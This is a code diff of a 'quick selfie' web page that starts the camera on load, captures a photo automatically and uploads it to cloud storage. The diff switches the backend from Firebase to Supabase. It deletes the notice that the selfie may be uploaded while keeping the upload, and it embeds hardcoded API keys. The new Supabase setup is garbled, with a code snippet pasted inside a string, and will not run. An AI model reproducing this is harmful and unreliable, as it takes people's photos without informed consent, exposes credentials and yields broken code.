@@ -125,13 +125,6 @@
       }
     }
 
-    .status-dot {
-      width: 7px;
-      height: 7px;
-      border-radius: 999px;
-      background: #22c55e;
-    }
-
     .card-footer {
       display: flex;
       justify-content: space-between;
@@ -224,9 +217,8 @@
         INSTANT SELFIE
       </div>
       <div class="title">Quick selfie capture</div>
-      <div class="subtitle">
-        We’ll ask for camera access and take a single photo automatically for verification.
-        By continuing, you agree this selfie may be uploaded to our secure storage.
+      <div class="subtitle">a
+        We’ll ask for camera acces.
       </div>
     </div>
 
@@ -242,8 +234,8 @@
 
     <div class="card-footer">
       <div class="hint">
-        Tip: Make sure you're in good lighting.<br />
-        Your photo is captured once per session.
+        Tip: Use good lighting.<br />
+        One selfie is captured per session. You can retake or download it.
       </div>
       <div class="actions">
         <button id="retakeBtn" class="btn-ghost hidden">
@@ -256,31 +248,19 @@
     </div>
   </div>
 
-  <!-- Firebase + app logic -->
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
-    import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-storage.js";
+  <!-- Supabase SDK from CDN -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
-    // Import the functions you need from the SDKs you need
-import { initializeApp } from "firebase/app";
-// TODO: Add SDKs for Firebase products that you want to use
-// https://firebase.google.com/docs/web/setup#available-libraries
+  <script>
+    // 🔴 PUT YOUR REAL VALUES HERE
+    const SUPABASE_URL = "
+import { createClient } from '@supabase/supabase-js'
+const supabaseUrl = 'https://ohbapvgkmtvgcgnlhbyz.supabase.co'
+const supabaseKey = process.env.SUPABASE_KEY
+const supabase = createClient(supabaseUrl, supabaseKey)";          // e.g. https://xyzcompany.supabase.co
+    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9oYmFwdmdrbXR2Z2NnbmxoYnl6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjUyNDkwMjQsImV4cCI6MjA4MDgyNTAyNH0.hpxvP0i9SDDLIjgU_EKAJoKpedJTyd-pgOHEvJkujLw";
 
-// Your web app's Firebase configuration
-const firebaseConfig = {
-  apiKey: "AIzaSyDusNIZpemRNW_9aa7PXLxvgDxxcN8SUiU",
-  authDomain: "selfie-capture-415e3.firebaseapp.com",
-  projectId: "selfie-capture-415e3",
-  storageBucket: "selfie-capture-415e3.firebasestorage.app",
-  messagingSenderId: "746810875738",
-  appId: "1:746810875738:web:5fa9d9172566212ea6dd63"
-};
-
-// Initialize Firebase
-const app = initializeApp(firebaseConfig);
-
-    const app = initializeApp(firebaseConfig);
-    const storage = getStorage(app);
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
     const video = document.getElementById("video");
     const photo = document.getElementById("photo");
@@ -344,7 +324,9 @@ const app = initializeApp(firebaseConfig);
     }
 
     function dataURLToBlob(dataUrl) {
-      const [header, base64] = dataUrl.split(",");
+      const parts = dataUrl.split(",");
+      const header = parts[0];
+      const base64 = parts[1];
       const mimeMatch = header.match(/data:(.*);base64/);
       const mime = mimeMatch ? mimeMatch[1] : "image/png";
       const binary = atob(base64);
@@ -356,15 +338,26 @@ const app = initializeApp(firebaseConfig);
       return new Blob([u8], { type: mime });
     }
 
-    async function uploadToFirebase(dataUrl) {
+    async function uploadToSupabase(dataUrl) {
       const blob = dataURLToBlob(dataUrl);
-      const filename = `selfies/selfie-${Date.now()}.png`;
-      const storageRef = ref(storage, filename);
+      const filename = `selfie-${Date.now()}.png`;
+      const filePath = `selfies/${filename}`; // folder path inside bucket
 
-      await uploadBytes(storageRef, blob);
-      const fileUrl = await getDownloadURL(storageRef);
-      console.log("Uploaded to Firebase:", fileUrl);
-      return fileUrl;
+      const { data, error } = await supabaseClient
+        .storage
+        .from("selfies")            // bucket name
+        .upload(filePath, blob, {
+          contentType: "image/png",
+          upsert: false,
+        });
+
+      if (error) {
+        console.error("Supabase upload error:", error);
+        throw error;
+      }
+
+      console.log("Uploaded:", data);
+      return data;
     }
 
     async function autoCapturePhoto() {
@@ -395,10 +388,9 @@ const app = initializeApp(firebaseConfig);
       setStatus("Photo captured. Uploading…", { loading: true });
 
       try {
-        await uploadToFirebase(dataUrl);
+        await uploadToSupabase(dataUrl);
         setStatus("Photo captured & uploaded.", { success: true });
       } catch (err) {
-        console.error("Firebase upload error:", err);
         setStatus("Captured, but upload failed.", { error: true });
       }
 
@@ -420,6 +412,7 @@ const app = initializeApp(firebaseConfig);
       document.body.removeChild(a);
     });
 
+    // Start camera automatically when page loads
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
       startCamera(true);
     } else {
